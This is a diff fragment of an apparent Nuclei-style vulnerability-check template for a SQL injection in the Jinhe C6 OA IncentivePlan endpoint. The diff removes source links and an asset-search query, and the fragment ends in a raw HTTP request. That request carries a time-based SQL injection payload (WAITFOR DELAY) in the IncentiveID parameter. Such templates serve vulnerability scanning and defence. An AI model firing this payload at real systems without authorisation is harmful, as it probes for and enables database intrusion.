@@ -3,14 +3,8 @@ info:
   name: 金和C6 JHSoft.Web.IncentivePlan接口SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fiac3w8q98f91mpb
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fiac3w8q98f91mpb
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:6%27--&TVersion=1 HTTP/1.1
